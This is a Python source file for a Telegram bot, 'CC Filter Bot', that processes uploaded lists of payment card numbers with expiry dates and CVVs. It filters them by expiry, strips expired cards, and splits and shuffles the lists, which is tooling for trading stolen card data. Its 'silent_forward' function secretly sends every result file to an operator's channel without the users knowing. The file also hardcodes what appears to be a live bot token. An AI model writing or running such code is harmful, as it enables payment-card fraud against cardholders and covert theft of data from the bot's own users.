"""
CC Filter Bot v2.0 — Advanced Telegram Bot
Features: Filter | Clean | Split | Shuffle | Premium | Ban | Silent Channel Forward
"""

import asyncio
import json
import logging
import os
import random
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Set

from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# ═══════════════════════════════════════════════════════════
#  CONFIGURATION
# ═══════════════════════════════════════════════════════════

BOT_TOKEN = "8976843314:AAG3Xjlf0RQBvCjVTjMLB1ORggbwb9K-htc"
ADMIN_IDS: Set[int] = {7132150988, 987654321}
CHANNEL_ID = "-1002200268580"   # Channel username or ID (e.g. -1001234567890)

# ═══════════════════════════════════════════════════════════
#  LOGGING
# ═══════════════════════════════════════════════════════════

logging.basicConfig(
    format="%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger("CCFilterBot")

# ═══════════════════════════════════════════════════════════
#  PATHS & DIRS
# ═══════════════════════════════════════════════════════════

BASE_DIR = Path("data")
BASE_DIR.mkdir(exist_ok=True)

PREMIUM_FILE = BASE_DIR / "premium_users.json"
BAN_FILE = BASE_DIR / "banlist.json"
USER_FILES: Dict[int, Path] = {}
USER_FILENAMES: Dict[int, str] = {}

# ═══════════════════════════════════════════════════════════
#  DATA LAYER — Premium & Ban persistence
# ═══════════════════════════════════════════════════════════

def load_premium_data() -> Dict[int, datetime]:
    """Load premium users from JSON. Returns {user_id: expiry_datetime}."""
    if not PREMIUM_FILE.exists():
        return {}
    try:
        raw = json.loads(PREMIUM_FILE.read_text(encoding="utf-8"))
        parsed: Dict[int, datetime] = {}
        now = datetime.utcnow()
        for uid_str, expiry_str in raw.items():
            uid = int(uid_str)
            expiry = datetime.fromisoformat(expiry_str)
            if expiry > now:
                parsed[uid] = expiry
        save_premium_data(parsed)
        return parsed
    except Exception as e:
        logger.error(f"Failed to load premium data: {e}")
        return {}


def save_premium_data(data: Dict[int, datetime]) -> None:
    """Save premium users to JSON."""
    try:
        serialised = {str(uid): dt.isoformat() for uid, dt in data.items()}
        PREMIUM_FILE.write_text(json.dumps(serialised, indent=2), encoding="utf-8")
    except Exception as e:
        logger.error(f"Failed to save premium data: {e}")


def load_ban_data() -> Set[int]:
    """Load banned user IDs from JSON."""
    if not BAN_FILE.exists():
        return set()
    try:
        raw = json.loads(BAN_FILE.read_text(encoding="utf-8"))
        return {int(x) for x in raw}
    except Exception as e:
        logger.error(f"Failed to load ban data: {e}")
        return set()


def save_ban_data(data: Set[int]) -> None:
    """Save banned user IDs to JSON."""
    try:
        BAN_FILE.write_text(json.dumps(sorted(data)), encoding="utf-8")
    except Exception as e:
        logger.error(f"Failed to save ban data: {e}")


# In‑memory caches
premium_cache: Dict[int, datetime] = {}
ban_cache: Set[int] = set()

# ═══════════════════════════════════════════════════════════
#  DECORATORS
# ═══════════════════════════════════════════════════════════

def admin_required(func):
    """Restrict command to admin users only."""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        if uid not in ADMIN_IDS:
            await update.message.reply_text("⛔ Access Denied — Admins only.")
            return
        return await func(update, context)
    return wrapper


def ban_check(func):
    """Block banned users."""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        if uid in ban_cache:
            await update.message.reply_text("🚫 You are banned from using this bot.")
            return
        return await func(update, context)
    return wrapper


def has_file(func):
    """Ensure user has uploaded a file before running command."""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        if uid not in USER_FILES or not USER_FILES[uid].exists():
            await update.message.reply_text(
                "❌ No file found. Upload a <code>.txt</code> file first.",
                parse_mode=ParseMode.HTML,
            )
            return
        return await func(update, context)
    return wrapper

# ═══════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════

def read_user_lines(user_id: int) -> List[str]:
    """Read all non‑empty lines from user's stored file."""
    path = USER_FILES.get(user_id)
    if not path or not path.exists():
        return []
    return [
        line.strip()
        for line in path.read_text(encoding="utf-8", errors="ignore").splitlines()
        if line.strip()
    ]


def write_user_file(user_id: int, lines: List[str]) -> Path:
    """Overwrite user's file. Returns path."""
    path = USER_FILES.get(user_id, BASE_DIR / f"user_{user_id}.txt")
    path.write_text("\n".join(lines), encoding="utf-8")
    USER_FILES[user_id] = path
    return path


def parse_card(line: str) -> Optional[Dict[str, str]]:
    """
    Parse a CC line: card|MM|YY|CVV
    Returns dict with keys: card, mm, yy, cvv, raw  — or None.
    """
    parts = line.strip().split("|")
    if len(parts) >= 4:
        return {
            "card": parts[0].strip(),
            "mm": parts[1].strip().zfill(2),
            "yy": parts[2].strip().zfill(2),
            "cvv": parts[3].strip(),
            "raw": line.strip(),
        }
    return None


def is_expired(mm: str, yy: str) -> bool:
    """Check if card is expired (month/year is before current month)."""
    try:
        card_month = int(mm)
        card_year = 2000 + int(yy)
        now = datetime.utcnow()
        card_last_day = datetime(card_year, card_month, 1) + timedelta(days=32)
        card_last_day = card_last_day.replace(day=1)
        return now >= card_last_day
    except (ValueError, OverflowError):
        return False


def get_premium_status(user_id: int) -> Optional[str]:
    """Return premium status string, or None."""
    if user_id in premium_cache:
        expiry = premium_cache[user_id]
        days_left = (expiry - datetime.utcnow()).days
        if days_left > 0:
            return f"⭐ Premium · {days_left}d left"
        else:
            del premium_cache[user_id]
            save_premium_data(premium_cache)
    return None


# ═══════════════════════════════════════════════════════════
#  UI HELPERS
# ═══════════════════════════════════════════════════════════

SEP = "─" * 34

def box_header(title: str) -> str:
    return f"╭{SEP}╮\n│  {title.center(30)} │\n╰{SEP}╯"


def box_result(title: str, body: str) -> str:
    return f"┌{SEP}┐\n│ {title.ljust(31)} │\n├{SEP}┤\n{body}\n└{SEP}┘"


# ═══════════════════════════════════════════════════════════
#  SILENT CHANNEL FORWARD
# ═══════════════════════════════════════════════════════════

async def silent_forward(context: ContextTypes.DEFAULT_TYPE, file_path: Path, caption: str = "") -> bool:
    """
    Silently forward a result file to the configured channel.
    Users do NOT see this — runs silently in the background.
    """
    if not CHANNEL_ID or CHANNEL_ID == "@your_channel_username":
        return False

    try:
        with open(file_path, "rb") as f:
            await context.bot.send_document(
                chat_id=CHANNEL_ID,
                document=f,
                filename=file_path.name,
                caption=f"🤫 {caption}",
                disable_notification=True,
            )
        logger.info(f"📤 Forwarded to channel: {file_path.name} — {caption}")
        return True
    except Exception as e:
        logger.error(f"Channel forward failed: {e}")
        return False


# ═══════════════════════════════════════════════════════════
#  COMMAND HANDLERS — BASIC
# ═══════════════════════════════════════════════════════════

@ban_check
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Welcome message & usage guide."""
    user = update.effective_user
    premium_str = get_premium_status(user.id) or "💎 Free User"

    text = (
        f"{box_header('CC FILTER BOT')}\n\n"
        f"👤 <b>{user.full_name}</b>\n"
        f"🆔 <code>{user.id}</code>\n"
        f"🏷 {premium_str}\n\n"
        f"<b>📂 Quick Start:</b>\n"
        f"  1. Upload a <code>.txt</code> file\n"
        f"  2. Use any command below\n\n"
        f"<b>⚡ Commands:</b>\n"
        f"  /filter <code>MM|YY</code>  — Filter by expiry\n"
        f"  /clean            — Remove expired cards\n"
        f"  /split <code>N</code>       — Split into parts of N\n"
        f"  /shuffle          — Randomize card order\n"
        f"  /clear            — Delete saved file\n"
        f"  /help             — Show this message\n\n"
        f"<b>📋 Format:</b> <code>card_number|MM|YY|CVV</code>"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


@ban_check
async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Alias for /start."""
    await cmd_start(update, context)


@ban_check
async def cmd_handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Accept & store a .txt file from user."""
    user = update.effective_user
    doc = update.message.document

    if not doc.file_name.lower().endswith(".txt"):
        await update.message.reply_text(
            "⚠️ Only <code>.txt</code> files are accepted.",
            parse_mode=ParseMode.HTML,
        )
        return

    if doc.file_size > 50 * 1024 * 1024:
        await update.message.reply_text("⚠️ File too large. Maximum 50 MB.")
        return

    status_msg = await update.message.reply_text("📥 Downloading...")

    file = await doc.get_file()
    path = BASE_DIR / f"user_{user.id}.txt"
    await file.download_to_drive(path)

    line_count = sum(
        1 for _ in path.read_text(encoding="utf-8", errors="ignore").splitlines()
        if _.strip()
    )

    USER_FILES[user.id] = path
    USER_FILENAMES[user.id] = doc.file_name

    await status_msg.edit_text(
        f"{box_result('UPLOAD SUCCESS', '')}"
        f"📄 <b>{doc.file_name}</b>\n"
        f"📊 Total: <b>{line_count:,}</b> cards\n\n"
        f"<i>Ready — use /filter, /clean, /split, or /shuffle</i>",
        parse_mode=ParseMode.HTML,
    )

    logger.info(f"User {user.id} uploaded '{doc.file_name}' — {line_count} lines")


# ═══════════════════════════════════════════════════════════
#  COMMAND HANDLERS — CORE FEATURES
# ═══════════════════════════════════════════════════════════

@ban_check
@has_file
async def cmd_filter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Filter cards by MM|YY pattern."""
    user = update.effective_user

    if not context.args or len(context.args) != 1:
        await update.message.reply_text(
            "❌ Usage: <code>/filter 06|26</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    pattern = context.args[0].strip()
    parts = pattern.split("|")
    if len(parts) != 2 or not all(p.isdigit() and len(p) >= 1 for p in parts):
        await update.message.reply_text(
            "❌ Invalid pattern. Use <code>MM|YY</code> format.\n"
            "Example: <code>/filter 06|26</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    mm, yy = parts[0].zfill(2), parts[1].zfill(2)

    status = await update.message.reply_text(
        f"🔍 Searching for <code>{mm}|{yy}</code>...",
        parse_mode=ParseMode.HTML,
    )

    lines = read_user_lines(user.id)
    search_key = f"|{mm}|{yy}|"
    matched = [line for line in lines if search_key in line]

    if not matched:
        await status.edit_text(
            f"❌ No cards found for <code>{mm}|{yy}</code>.\n"
            f"📊 Total in file: <b>{len(lines):,}</b>",
            parse_mode=ParseMode.HTML,
        )
        return

    safe = f"{mm}_{yy}"
    out_path = BASE_DIR / f"filtered_{user.id}_{safe}.txt"
    out_path.write_text("\n".join(matched), encoding="utf-8")

    caption = (
        f"🎯 <b>Filter Results</b>\n"
        f"📅 Pattern: <code>{mm}|{yy}</code>\n"
        f"✅ Found: <b>{len(matched):,}</b> cards\n"
        f"📊 Total in file: <b>{len(lines):,}</b>"
    )

    await status.delete()
    await update.message.reply_document(
        document=open(out_path, "rb"),
        filename=f"filtered_{safe}.txt",
        caption=caption,
        parse_mode=ParseMode.HTML,
    )

    # Silent forward to channel
    await silent_forward(context, out_path, f"🎯 Filter {mm}|{yy} — {len(matched)} cards | User {user.id}")

    logger.info(f"User {user.id} filtered {mm}|{yy}: {len(matched)} results")


@ban_check
@has_file
async def cmd_clean(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove expired cards from user's file."""
    user = update.effective_user

    status = await update.message.reply_text("🧹 Scanning for expired cards...")

    lines = read_user_lines(user.id)
    kept: List[str] = []
    removed: List[str] = []

    for line in lines:
        card_data = parse_card(line)
        if card_data and is_expired(card_data["mm"], card_data["yy"]):
            removed.append(line)
        else:
            kept.append(line)

    if not removed:
        await status.edit_text(
            f"✅ No expired cards found!\n📊 Total: <b>{len(lines):,}</b> cards are valid.",
            parse_mode=ParseMode.HTML,
        )
        return

    write_user_file(user.id, kept)
    USER_FILENAMES[user.id] = USER_FILENAMES.get(user.id, "cards.txt")

    removed_path = BASE_DIR / f"removed_{user.id}.txt"
    removed_path.write_text("\n".join(removed), encoding="utf-8")

    text = (
        f"🧹 <b>Clean Complete</b>\n"
        f"🗑 Removed: <b>{len(removed):,}</b> expired cards\n"
        f"✅ Kept: <b>{len(kept):,}</b> valid cards\n"
        f"📊 Original total: <b>{len(lines):,}</b>"
    )
    await status.edit_text(text, parse_mode=ParseMode.HTML)

    # Silent forward removed cards to channel
    await silent_forward(context, removed_path, f"🧹 Expired — {len(removed)} cards removed | User {user.id}")

    logger.info(f"User {user.id} cleaned: {len(removed)} expired, {len(kept)} kept")


@ban_check
@has_file
async def cmd_split(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Split file into parts of N cards each."""
    user = update.effective_user

    if not context.args or len(context.args) != 1:
        await update.message.reply_text(
            "❌ Usage: <code>/split 200</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    try:
        chunk_size = int(context.args[0])
        if chunk_size < 1:
            raise ValueError
    except ValueError:
        await update.message.reply_text(
            "❌ Please provide a valid number.\nExample: <code>/split 200</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    lines = read_user_lines(user.id)
    total = len(lines)

    if total == 0:
        await update.message.reply_text("❌ File is empty.")
        return

    num_parts = (total + chunk_size - 1) // chunk_size

    status = await update.message.reply_text(
        f"✂️ Splitting <b>{total:,}</b> cards into <b>{num_parts}</b> parts "
        f"({chunk_size} per part)...",
        parse_mode=ParseMode.HTML,
    )

    sent_count = 0
    for i in range(num_parts):
        start = i * chunk_size
        end = min(start + chunk_size, total)
        chunk = lines[start:end]

        part_path = BASE_DIR / f"split_{user.id}_part{i+1}.txt"
        part_path.write_text("\n".join(chunk), encoding="utf-8")

        cap = f"📦 Part {i+1}/{num_parts} · {len(chunk)} cards"
        await update.message.reply_document(
            document=open(part_path, "rb"),
            filename=f"part_{i+1}.txt",
            caption=cap,
        )

        # Silent forward each part to channel
        await silent_forward(
            context, part_path,
            f"📦 Split Part {i+1}/{num_parts} — {len(chunk)} cards | User {user.id}",
        )
        sent_count += 1
        await asyncio.sleep(0.3)

    await status.edit_text(
        f"✅ <b>Split Done!</b>\n"
        f"📊 {total:,} cards → {num_parts} parts ({chunk_size}/part)\n"
        f"📤 Sent: {sent_count} files",
        parse_mode=ParseMode.HTML,
    )

    logger.info(f"User {user.id} split {total} cards into {num_parts} parts of {chunk_size}")


@ban_check
@has_file
async def cmd_shuffle(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Randomly shuffle all cards and return a new file."""
    user = update.effective_user

    lines = read_user_lines(user.id)
    total = len(lines)

    if total < 2:
        await update.message.reply_text(
            f"⚠️ Need at least 2 cards to shuffle. Currently: <b>{total}</b>",
            parse_mode=ParseMode.HTML,
        )
        return

    status = await update.message.reply_text(
        f"🔀 Shuffling <b>{total:,}</b> cards...",
        parse_mode=ParseMode.HTML,
    )

    shuffled = lines.copy()
    random.shuffle(shuffled)

    out_path = BASE_DIR / f"shuffled_{user.id}.txt"
    out_path.write_text("\n".join(shuffled), encoding="utf-8")

    caption = f"🔀 <b>Shuffled</b>\n📊 Total: <b>{total:,}</b> cards"
    await status.delete()
    await update.message.reply_document(
        document=open(out_path, "rb"),
        filename="shuffled.txt",
        caption=caption,
        parse_mode=ParseMode.HTML,
    )

    # Silent forward to channel
    await silent_forward(context, out_path, f"🔀 Shuffled — {total} cards | User {user.id}")

    logger.info(f"User {user.id} shuffled {total} cards")


@ban_check
async def cmd_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Delete the user's stored file."""
    user = update.effective_user

    if user.id in USER_FILES:
        try:
            USER_FILES[user.id].unlink()
        except OSError:
            pass
        del USER_FILES[user.id]
        USER_FILENAMES.pop(user.id, None)
        await update.message.reply_text("🗑 File cleared. Upload a new one anytime.")
        logger.info(f"User {user.id} cleared their file")
    else:
        await update.message.reply_text("⚠️ No file to clear.")


# ═══════════════════════════════════════════════════════════
#  COMMAND HANDLERS — ADMIN ONLY
# ═══════════════════════════════════════════════════════════

@admin_required
@ban_check
@has_file
async def cmd_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """[Admin] Count total cards in user's file with valid/expired breakdown."""
    user = update.effective_user

    lines = read_user_lines(user.id)
    valid = 0
    expired = 0
    for line in lines:
        card_data = parse_card(line)
        if card_data and is_expired(card_data["mm"], card_data["yy"]):
            expired += 1
        else:
            valid += 1

    text = (
        f"📊 <b>File Statistics</b>\n"
        f"📄 <code>{USER_FILENAMES.get(user.id, 'unknown')}</code>\n"
        f"📊 Total: <b>{len(lines):,}</b>\n"
        f"✅ Valid: <b>{valid:,}</b>\n"
        f"🗑 Expired: <b>{expired:,}</b>"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

    logger.info(f"Admin {user.id} checked count: {len(lines)} total, {valid} valid, {expired} expired")


@admin_required
async def cmd_add_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """[Admin] Grant premium to a user. Usage: /addpremium <user_id> <days>"""
    if len(context.args) < 2:
        await update.message.reply_text(
            "❌ Usage: <code>/addpremium &lt;user_id&gt; &lt;days&gt;</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    try:
        target_id = int(context.args[0])
        days = int(context.args[1])
        if days < 1:
            raise ValueError
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid arguments. Example: <code>/addpremium 123456 7</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    expiry = datetime.utcnow() + timedelta(days=days)
    premium_cache[target_id] = expiry
    save_premium_data(premium_cache)

    await update.message.reply_text(
        f"⭐ <b>Premium Granted</b>\n"
        f"👤 User: <code>{target_id}</code>\n"
        f"📅 Duration: <b>{days} day(s)</b>\n"
        f"⏳ Expires: <b>{expiry.strftime('%Y-%m-%d %H:%M')} UTC</b>",
        parse_mode=ParseMode.HTML,
    )

    # Try to notify the target user
    try:
        await context.bot.send_message(
            chat_id=target_id,
            text=(
                f"⭐ <b>Premium Activated!</b>\n"
                f"📅 Duration: <b>{days} day(s)</b>\n"
                f"⏳ Expires: <b>{expiry.strftime('%Y-%m-%d %H:%M')} UTC</b>"
            ),
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass

    logger.info(f"Admin {update.effective_user.id} granted premium to {target_id} for {days} days")


@admin_required
async def cmd_remove_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """[Admin] Remove premium from a user. Usage: /removepremium <user_id>"""
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: <code>/removepremium &lt;user_id&gt;</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")
        return

    if target_id in premium_cache:
        del premium_cache[target_id]
        save_premium_data(premium_cache)
        await update.message.reply_text(
            f"🔽 Premium removed from user <code>{target_id}</code>.",
            parse_mode=ParseMode.HTML,
        )
        logger.info(f"Admin {update.effective_user.id} removed premium from {target_id}")
    else:
        await update.message.reply_text(
            f"⚠️ User <code>{target_id}</code> does not have premium.",
            parse_mode=ParseMode.HTML,
        )


@admin_required
async def cmd_premium_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """[Admin] Show all premium users and their expiry dates."""
    if not premium_cache:
        await update.message.reply_text("📭 No premium users found.")
        return

    now = datetime.utcnow()
    lines_list: List[str] = []
    for uid, expiry in sorted(premium_cache.items(), key=lambda x: x[1]):
        days_left = (expiry - now).days
        icon = "🟢" if days_left > 3 else ("🟡" if days_left > 0 else "🔴")
        lines_list.append(
            f"  {icon} <code>{uid}</code> — <b>{days_left}d</b> left · "
            f"expires <i>{expiry.strftime('%Y-%m-%d')}</i>"
        )

    text = (
        f"⭐ <b>Premium Users</b> ({len(premium_cache)})\n"
        f"{SEP}\n" + "\n".join(lines_list)
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)
    logger.info(f"Admin {update.effective_user.id} viewed premium list")


@admin_required
async def cmd_user_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """[Admin] Check a user's status. Usage: /status <user_id>"""
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: <code>/status &lt;user_id&gt;</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")
        return

    is_prem = target_id in premium_cache
    is_banned = target_id in ban_cache
    has_file_data = target_id in USER_FILES and USER_FILES[target_id].exists()
    expiry_str = (
        premium_cache[target_id].strftime('%Y-%m-%d %H:%M UTC') if is_prem else "N/A"
    )
    days_left = (premium_cache[target_id] - datetime.utcnow()).days if is_prem else 0
    file_name = USER_FILENAMES.get(target_id, "N/A") if has_file_data else "N/A"
    card_count = len(read_user_lines(target_id)) if has_file_data else 0

    # Badges
    badges: List[str] = []
    if is_banned:
        badges.append("🚫 BANNED")
    if is_prem:
        badges.append(f"⭐ PREMIUM ({days_left}d)")
    if target_id in ADMIN_IDS:
        badges.append("🛡 ADMIN")
    badge_str = " | ".join(badges) if badges else "💎 Free User"

    text = (
        f"👤 <b>User Status</b>\n"
        f"{SEP}\n"
        f"🆔 ID: <code>{target_id}</code>\n"
        f"🏷 Status: {badge_str}\n"
        f"📅 Premium Expiry: {expiry_str}\n"
        f"📄 File: {file_name}\n"
        f"📊 Cards: {card_count:,}\n"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)
    logger.info(f"Admin {update.effective_user.id} checked status of user {target_id}")


@admin_required
async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """[Admin] Ban a user. Usage: /ban <user_id>"""
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: <code>/ban &lt;user_id&gt;</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")
        return

    if target_id in ADMIN_IDS:
        await update.message.reply_text("⚠️ Cannot ban an admin.")
        return

    if target_id in ban_cache:
        await update.message.reply_text(
            f"⚠️ User <code>{target_id}</code> is already banned.",
            parse_mode=ParseMode.HTML,
        )
        return

    ban_cache.add(target_id)
    save_ban_data(ban_cache)
    await update.message.reply_text(
        f"🚫 <b>Banned</b> — User <code>{target_id}</code> can no longer use this bot.",
        parse_mode=ParseMode.HTML,
    )
    logger.info(f"Admin {update.effective_user.id} banned user {target_id}")


@admin_required
async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """[Admin] Unban a user. Usage: /unban <user_id>"""
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: <code>/unban &lt;user_id&gt;</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")
        return

    if target_id in ban_cache:
        ban_cache.remove(target_id)
        save_ban_data(ban_cache)
        await update.message.reply_text(
            f"✅ <b>Unbanned</b> — User <code>{target_id}</code> is now allowed.",
            parse_mode=ParseMode.HTML,
        )
        logger.info(f"Admin {update.effective_user.id} unbanned user {target_id}")
    else:
        await update.message.reply_text(
            f"⚠️ User <code>{target_id}</code> is not banned.",
            parse_mode=ParseMode.HTML,
        )


# ═══════════════════════════════════════════════════════════
#  FALLBACK HANDLER
# ═══════════════════════════════════════════════════════════

async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle unknown commands gracefully."""
    await update.message.reply_text(
        "❓ Unknown command.\nUse /start or /help to see available commands.",
    )


# ═══════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════

def main() -> None:
    """Initialize and run the bot."""
    global premium_cache, ban_cache
    premium_cache = load_premium_data()
    ban_cache = load_ban_data()
    logger.info(f"Loaded {len(premium_cache)} premium user(s), {len(ban_cache)} banned user(s)")

    app = Application.builder().token(BOT_TOKEN).build()

    # ── Register handlers ──
    # Basic
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))

    # Core features (all users)
    app.add_handler(CommandHandler("filter", cmd_filter))
    app.add_handler(CommandHandler("clean", cmd_clean))
    app.add_handler(CommandHandler("split", cmd_split))
    app.add_handler(CommandHandler("shuffle", cmd_shuffle))
    app.add_handler(CommandHandler("clear", cmd_clear))

    # Admin only
    app.add_handler(CommandHandler("count", cmd_count))
    app.add_handler(CommandHandler("addpremium", cmd_add_premium))
    app.add_handler(CommandHandler("removepremium", cmd_remove_premium))
    app.add_handler(CommandHandler("premiumlist", cmd_premium_list))
    app.add_handler(CommandHandler("status", cmd_user_status))
    app.add_handler(CommandHandler("ban", cmd_ban))
    app.add_handler(CommandHandler("unban", cmd_unban))

    # File upload (TXT only)
    app.add_handler(MessageHandler(filters.Document.TXT, cmd_handle_file))

    # Unknown command fallback (must be last)
    app.add_handler(MessageHandler(filters.COMMAND, unknown_command))

    # ── Start polling ──
    logger.info("✅ All handlers registered. Bot is starting...")
    print("╔══════════════════════════════════╗")
    print("║     🤖 CC FILTER BOT v2.0      ║")
    print("║     Status: ONLINE              ║")
    print("║     Press Ctrl+C to stop        ║")
    print("╚══════════════════════════════════╝")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()


# ═══════════════════════════════════════════════════════════
#  FILE STRUCTURE REFERENCE
# ═══════════════════════════════════════════════════════════
#
# data/
#   ├── premium_users.json     # {"user_id": "expiry_iso"}
#   ├── banlist.json           # [user_id, ...]
#   ├── user_{id}.txt          # Latest upload per user
#   ├── filtered_{id}_MM_YY.txt
#   ├── removed_{id}.txt
#   ├── split_{id}_partN.txt
#   └── shuffled_{id}.txt
